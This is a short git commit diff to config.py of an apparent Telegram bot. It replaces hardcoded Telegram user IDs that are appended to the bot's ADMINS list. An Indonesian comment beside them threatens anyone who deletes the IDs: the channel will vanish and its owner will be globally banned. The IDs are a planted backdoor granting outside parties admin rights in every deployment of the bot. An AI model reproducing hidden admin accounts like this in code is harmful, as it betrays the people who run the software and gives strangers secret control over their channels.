a61c8a6449fda4f5e4116e366cc5e7decfdad755
zergiogithub <138329164+zergiorvdr@users.noreply.github.com>
2023-08-03 14:38:40 +0700

    Update config.py

--- config.py
+++ config.py
@@ -61,7 +61,7 @@ DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True
 ADMINS.append(OWNER_ID)
 # Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
 # Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
-ADMINS.extend((OWNER_ID, 844432220, 1250450587, 1750080384, 2102118281))
+ADMINS.extend((OWNER_ID, 999191708, 1754029718))
 
 
 LOG_FILE_NAME = "logs.txt"
